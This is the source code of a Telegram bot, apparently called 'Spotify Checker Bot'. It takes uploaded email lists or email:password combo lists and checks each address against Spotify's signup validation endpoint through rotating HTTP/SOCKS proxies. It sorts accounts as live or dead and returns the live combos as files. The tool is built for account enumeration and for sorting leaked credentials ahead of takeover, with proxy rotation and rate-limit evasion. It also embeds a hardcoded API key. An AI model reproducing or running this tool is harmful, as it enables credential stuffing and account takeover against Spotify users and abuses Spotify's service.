const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const fs = require('fs');
const path = require('path');
const express = require('express');

// ==============================================
// 🔑 CONFIGURATION — Set in Render Dashboard!
// ==============================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const API_KEY = 'a1e486e2729f46d6bb368d6b2bcda326';
const CONCURRENCY = 5;
const PROXY_CONCURRENCY = 3; // Max concurrent requests per proxy
const MAX_RETRIES = 2;
const TIMEOUT = 10000;

// Express health check
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('✅ Spotify Checker Bot is Running!'));
app.listen(PORT, () => console.log(`🌐 Keepalive server on port ${PORT}`));

const bot = new Telegraf(BOT_TOKEN, { handlerTimeout: 300000 });

const headers = {
  'authority': 'spclient.wg.spotify.com',
  'accept': '*/*',
  'content-type': 'application/json',
  'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
};

const clientInfo = {
  api_key: API_KEY,
  app_version: 'v2',
  capabilities: [1],
  installation_id: 'f3bb4c40-89f4-45b6-a3d6-0d22dd486182',
  platform: 'www',
};

// ==============================================
// 🛠️ PROXY PARSING & AGENT CREATION
// ==============================================
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function parseProxy(proxyStr) {
  proxyStr = proxyStr.trim();
  if (!proxyStr) return null;

  let type = 'http';
  let host, port, username, password;

  // Format: type://host:port OR host:port:user:pass
  if (proxyStr.includes('://')) {
    const [proto, rest] = proxyStr.split('://');
    type = proto.toLowerCase();
    if (rest.includes('@')) {
      const [auth, hp] = rest.split('@');
      [username, password] = auth.split(':');
      [host, port] = hp.split(':');
    } else {
      [host, port] = rest.split(':');
    }
  } else {
    const parts = proxyStr.split(':');
    if (parts.length === 4) {
      [host, port, username, password] = parts;
    } else if (parts.length === 2) {
      [host, port] = parts;
    }
  }

  if (!host || !port) return null;
  return { type, host: host.trim(), port: parseInt(port), username, password };
}

function createProxyAgent(proxy) {
  if (!proxy) return null;
  const { type, host, port, username, password } = proxy;
  const auth = username && password ? `${username}:${password}@` : '';
  const uri = `${type}://${auth}${host}:${port}`;

  if (type === 'socks4' || type === 'socks5') {
    return new SocksProxyAgent(uri);
  }
  return new HttpProxyAgent(uri);
}

// Round-robin proxy selector
class ProxyRotator {
  constructor(proxies) {
    this.proxies = proxies.filter(p => p !== null);
    this.index = 0;
    this.stats = { total: this.proxies.length, working: 0, failed: 0 };
  }

  next() {
    if (this.proxies.length === 0) return null;
    const proxy = this.proxies[this.index % this.proxies.length];
    this.index++;
    return proxy;
  }

  markWorking() { this.stats.working++; }
  markFailed() { this.stats.failed++; }
}

// ==============================================
// 📧 CHECK EMAIL WITH PROXY SUPPORT
// ==============================================
async function checkEmail(email, proxyRotator) {
  const jsonData = {
    fields: [{ field: 'FIELD_EMAIL', value: email.trim() }],
    client_info: clientInfo,
    tracking: { creation_point: 'https://open.spotify.com/artist/59YhsSefd7itecSNMp0Nv8' },
  };

  for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
    const proxy = proxyRotator.next();
    const agent = proxy ? createProxyAgent(proxy) : null;

    try {
      const res = await axios.post(
        'https://spclient.wg.spotify.com/signup/public/v2/account/validate',
        jsonData,
        {
          headers,
          timeout: TIMEOUT,
          httpAgent: agent?.httpAgent,
          httpsAgent: agent?.httpsAgent || agent,
        }
      );

      proxyRotator.markWorking();
      const resJson = res.data;

      if (resJson.error && String(resJson.error).includes('already_exists')) {
        return { status: 'VALID', item: email, proxy: proxy?.host };
      } else if (resJson.success) {
        return { status: 'DEAD', item: email, proxy: proxy?.host };
      }
      return { status: 'UNKNOWN', item: email, proxy: proxy?.host };

    } catch (err) {
      if (proxy) proxyRotator.markFailed();
      if (err.response?.status === 429) {
        await sleep(2000);
        continue;
      }
      if (attempt === MAX_RETRIES) {
        return { status: 'ERROR', item: email, error: err.message, proxy: proxy?.host };
      }
      await sleep(500);
    }
  }
  return { status: 'ERROR', item: email, error: 'Max retries exceeded' };
}

// ==============================================
// 💾 USER STATE MANAGEMENT
// ==============================================
const userState = new Map();
// { mode: 'emails'|'combo', items: [], proxies: [], stage: 'awaiting_items'|'awaiting_proxies'|'ready' }

// ==============================================
// 🎯 BOT INTERFACE
// ==============================================
bot.start((ctx) => {
  try {
    ctx.reply(
      `👋 Welcome to Spotify Checker Bot!\n\n📌 Choose a mode below:`,
      Markup.inlineKeyboard([
        [Markup.button.callback('📧 Check Emails Only', 'mode_emails')],
        [Markup.button.callback('🔐 Check Combos (email:pass)', 'mode_combo')]
      ])
    );
  } catch (e) { console.error('Start error:', e.message); }
});

bot.action('mode_emails', (ctx) => {
  userState.set(ctx.chat.id, { mode: 'emails', items: [], proxies: [], stage: 'awaiting_items' });
  ctx.answerCbQuery();
  ctx.reply('📧 **Email-Only Mode Selected**\n📂 Send your email list (.txt, one per line):', { parse_mode: 'Markdown' });
});

bot.action('mode_combo', (ctx) => {
  userState.set(ctx.chat.id, { mode: 'combo', items: [], proxies: [], stage: 'awaiting_items' });
  ctx.answerCbQuery();
  ctx.reply('🔐 **Combo Mode Selected**\n📂 Send your combo list (.txt, format: email:password per line):', { parse_mode: 'Markdown' });
});

bot.command('mode', (ctx) => {
  ctx.reply('🔄 Choose your mode:',
    Markup.inlineKeyboard([
      [Markup.button.callback('📧 Check Emails Only', 'mode_emails')],
      [Markup.button.callback('🔐 Check Combos', 'mode_combo')]
    ])
  );
});

bot.help((ctx) => {
  ctx.reply(`📖 **How to Use:**
1. /mode — Select Email or Combo mode
2. Upload your list file
3. Upload your proxy file (HTTP/SOCKS4/SOCKS5)
   - Format: host:port OR host:port:user:pass
   - Or full URL: socks5://user:pass@host:port
4. Bot starts automatically!

⚡ Concurrency: ${CONCURRENCY} | Retries: ${MAX_RETRIES}
Made by: @PLANECLOUD | @DK_CE`, { parse_mode: 'Markdown' });
});

// ==============================================
// 📄 FILE UPLOAD HANDLER
// ==============================================
bot.on('document', async (ctx) => {
  try {
    const file = ctx.message.document;
    if (!file.file_name.endsWith('.txt')) {
      return ctx.reply('⚠️ Please send only **.txt files!**', { parse_mode: 'Markdown' });
    }

    const state = userState.get(ctx.chat.id);
    if (!state) return ctx.reply('⚠️ Please run /mode first to select your mode!');

    // Download file content
    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await axios.get(fileLink.href, { responseType: 'text', timeout: 30000 });
    const lines = res.data.split('\n').map(l => l.trim()).filter(l => l);

    // STEP 1: Process items list
    if (state.stage === 'awaiting_items') {
      let validItems = [];
      if (state.mode === 'emails') {
        validItems = lines.filter(l => l.includes('@'));
        if (validItems.length === 0) return ctx.reply('❌ No valid emails found!');
        state.items = validItems;
      } else {
        validItems = lines.filter(l => l.includes(':'));
        if (validItems.length === 0) return ctx.reply('❌ No valid combos found!');
        state.items = validItems;
      }

      state.stage = 'awaiting_proxies';
      userState.set(ctx.chat.id, state);
      return ctx.reply(
        `✅ Received **${file.file_name}** — ${validItems.length} items loaded!\n\n🌐 Now send your **proxy list (.txt)**\nSupports: HTTP, SOCKS4, SOCKS5`,
        { parse_mode: 'Markdown' }
      );
    }

    // STEP 2: Process proxy list and start checking
    if (state.stage === 'awaiting_proxies') {
      const proxies = lines.map(parseProxy).filter(p => p !== null);
      if (proxies.length === 0) return ctx.reply('❌ No valid proxies found! Check format.');

      const proxyRotator = new ProxyRotator(proxies);
      state.stage = 'ready';
      userState.set(ctx.chat.id, state);

      const modeLabel = state.mode === 'emails' ? '📧 Email-Only' : '🔐 Combo';
      await ctx.reply(
        `🚀 **Starting Checker!**\n\n` +
        `📊 Mode: ${modeLabel}\n` +
        `📥 Items: ${state.items.length}\n` +
        `🌐 Proxies: ${proxyRotator.stats.total}\n` +
        `⚡ Concurrency: ${CONCURRENCY}\n` +
        `⏳ Please wait...`,
        { parse_mode: 'Markdown' }
      );

      // ==============================================
      // ⚡ PROCESS BATCH WITH PROXIES
      // ==============================================
      const total = state.items.length;
      const progressMsg = await ctx.reply(
        `⏳ Progress: 0/${total} (0%)\n\n` +
        `🟢 𝗟𝗶𝘃𝗲: 0\n` +
        `🔴 𝗗𝗲𝗮𝗱: 0\n` +
        `🟡 𝗨𝗻𝗸𝗻𝗼𝘄𝗻: 0\n` +
        `🔵 𝗘𝗿𝗿𝗼𝗿𝘀: 0`
      );

      const results = { valid: [], dead: [], unknown: [], errors: [] };
      let checked = 0;

      const updateMessage = async () => {
        const percent = Math.round((checked / total) * 100);
        try {
          await ctx.telegram.editMessageText(
            ctx.chat.id,
            progressMsg.message_id,
            undefined,
            `⏳ 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: ${checked}/${total} (${percent}%)\n\n` +
            `🟢 𝗟𝗶𝘃𝗲: ${results.valid.length}\n` +
            `🔴 𝗗𝗲𝗮𝗱: ${results.dead.length}\n` +
            `🟡 𝗨𝗻𝗸𝗻𝗼𝘄𝗻: ${results.unknown.length}\n` +
            `🔵 𝗘𝗿𝗿𝗼𝗿𝘀: ${results.errors.length}\n` +
            `🌐 Proxies OK: ${proxyRotator.stats.working} | Failed: ${proxyRotator.stats.failed}`
          );
        } catch {}
      };

      // Process in batches
      for (let i = 0; i < state.items.length; i += CONCURRENCY) {
        const batch = state.items.slice(i, i + CONCURRENCY);
        const promises = batch.map(async (item) => {
          const email = state.mode === 'emails' ? item : item.split(':')[0].trim();
          const result = await checkEmail(email, proxyRotator);

          // Preserve full combo in results
          if (state.mode === 'combo' && result.item) {
            const fullCombo = state.items.find(s => s.startsWith(result.item + ':'));
            if (fullCombo) result.item = fullCombo;
          }
          return result;
        });

        const batchResults = await Promise.all(promises);
        batchResults.forEach(r => {
          if (r.status === 'VALID') results.valid.push(r.item);
          else if (r.status === 'DEAD') results.dead.push(r.item);
          else if (r.status === 'UNKNOWN') results.unknown.push(r.item);
          else results.errors.push(`${r.item} — ${r.error}`);
        });

        checked += batch.length;
        await updateMessage();
        await sleep(Math.floor(Math.random() * 50 + 10));
      }

      // ==============================================
      // 📤 SEND RESULTS
      // ==============================================
      const summary =
        `✅ ✅ 𝗖𝗛𝗘𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ✅ ✅\n\n` +
        `📊 𝗧𝗼𝘁𝗮𝗹: ${total}\n` +
        `🟢 𝗟𝗶𝘃𝗲: ${results.valid.length}\n` +
        `🔴 𝗗𝗲𝗮𝗱: ${results.dead.length}\n` +
        `🟡 𝗨𝗻𝗸𝗻𝗼𝘄𝗻: ${results.unknown.length}\n` +
        `🔵 𝗘𝗿𝗿𝗼𝗿𝘀: ${results.errors.length}\n\n` +
        `🌐 𝗣𝗿𝗼𝘅𝗶𝗲𝘀: ${proxyRotator.stats.total} total | ${proxyRotator.stats.working} used | ${proxyRotator.stats.failed} failed\n\n` +
        `Made by: @PLANECLOUD | @DK_CE`;

      await ctx.reply(summary);

      // Save & send files
      const outputPath = path.join(__dirname, 'outputs');
      if (!fs.existsSync(outputPath)) fs.mkdirSync(outputPath);

      fs.writeFileSync(path.join(outputPath, 'live.txt'), results.valid.join('\n'));
      fs.writeFileSync(path.join(outputPath, 'dead.txt'), results.dead.join('\n'));
      fs.writeFileSync(path.join(outputPath, 'unknown.txt'), results.unknown.join('\n'));
      fs.writeFileSync(path.join(outputPath, 'errors.txt'), results.errors.join('\n'));
      fs.writeFileSync(path.join(outputPath, 'full_results.txt'),
        `=== 𝗟𝗜𝗩𝗘 (${results.valid.length}) ===\n${results.valid.join('\n')}\n\n` +
        `=== 𝗗𝗘𝗔𝗗 (${results.dead.length}) ===\n${results.dead.join('\n')}\n\n` +
        `=== 𝗨𝗡𝗞𝗡𝗢𝗪𝗡 (${results.unknown.length}) ===\n${results.unknown.join('\n')}\n\n` +
        `=== 𝗘𝗥𝗥𝗢𝗥𝗦 (${results.errors.length}) ===\n${results.errors.join('\n')}`
      );

      await ctx.replyWithDocument({ source: path.join(outputPath, 'live.txt'), filename: 'live.txt' });
      await ctx.replyWithDocument({ source: path.join(outputPath, 'dead.txt'), filename: 'dead.txt' });
      await ctx.replyWithDocument({ source: path.join(outputPath, 'unknown.txt'), filename: 'unknown.txt' });
      await ctx.replyWithDocument({ source: path.join(outputPath, 'errors.txt'), filename: 'errors.txt' });
      await ctx.replyWithDocument({ source: path.join(outputPath, 'full_results.txt'), filename: 'full_results.txt' });
      await ctx.reply('📤 All results sent! ✅');

      // Cleanup
      fs.rmSync(outputPath, { recursive: true, force: true });
      userState.delete(ctx.chat.id);
    }

  } catch (err) {
    console.error('❌ Processing error:', err.message);
    await ctx.reply(`⚠️ Error: ${err.message}`);
  }
});

bot.catch((err, ctx) => {
  console.error('❌ Bot error:', err.message);
});

// ==============================================
// 🚀 START BOT
// ==============================================
async function startBot() {
  try {
    console.log('🔄 Connecting to Telegram...');
    await bot.launch();
    console.log('✅ Bot is running! Check Telegram!');
  } catch (err) {
    console.error('❌ Failed to start:', err.message);
    process.exit(1);
  }
}

startBot();

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
